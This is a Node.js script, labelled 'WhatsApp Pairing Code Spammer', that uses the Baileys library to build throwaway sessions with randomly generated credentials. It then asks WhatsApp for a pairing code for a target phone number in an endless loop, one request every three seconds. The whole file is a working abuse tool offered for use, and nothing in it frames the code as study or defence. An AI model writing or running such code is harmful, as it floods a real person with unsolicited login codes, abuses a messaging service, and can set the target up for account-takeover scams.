const { default: makeWASocket, Browsers } = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");

const TARGET = process.argv[2] || "628123456789"; // Change this or pass as argument
const DELAY_MS = 3000; // 3 seconds between each pairing request
const SESSION_DIR = "./session_auth";

// Clean up old sessions
if (fs.existsSync(SESSION_DIR)) {
  fs.rmSync(SESSION_DIR, { recursive: true, force: true });
}

console.log(`
  ======================================
   WhatsApp Pairing Code Spammer
   Target: ${TARGET}
   Delay: ${DELAY_MS}ms
  ======================================
`);

let count = 0;

function sendPairing() {
  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    browser: Browsers.macOS("Desktop"),
    auth: {
      creds: {
        signedIdentityKey: {
          private: { type: "Buffer", data: require("crypto").randomBytes(32) },
          public: { type: "Buffer", data: require("crypto").randomBytes(32) },
        },
        signedPreKey: {
          keyPair: {
            private: { type: "Buffer", data: require("crypto").randomBytes(32) },
            public: { type: "Buffer", data: require("crypto").randomBytes(32) },
          },
          signature: require("crypto").randomBytes(64),
          keyId: 1,
        },
        registrationId: 1,
        advSecretKey: require("crypto").randomBytes(32).toString("base64"),
        nextPreKeyId: 1,
        firstUnuploadedPreKeyId: 1,
        serverHasPreKeys: false,
        account: {
          details: {
            isNumber: true,
            countryCode: "ID",
            phoneNumber: Math.random().toString().slice(2, 12),
          },
        },
      },
      keys: {},
    },
  });

  sock.ev.on("creds.update", () => {});
  sock.ev.on("connection.update", async (update) => {
    const { connection } = update;
    if (connection === "open") {
      try {
        await sock.requestPairingCode(TARGET);
        count++;
        console.log(`[${count}] Pairing code sent to ${TARGET}`);
      } catch (e) {
        console.log(`[${count}] Failed: ${e.message?.slice(0, 50)}`);
      }
      sock.end(undefined);
      setTimeout(sendPairing, DELAY_MS);
    }
    if (connection === "close") {
      // Connection closed, will retry via the timeout above
    }
  });
}

// Start the loop
sendPairing();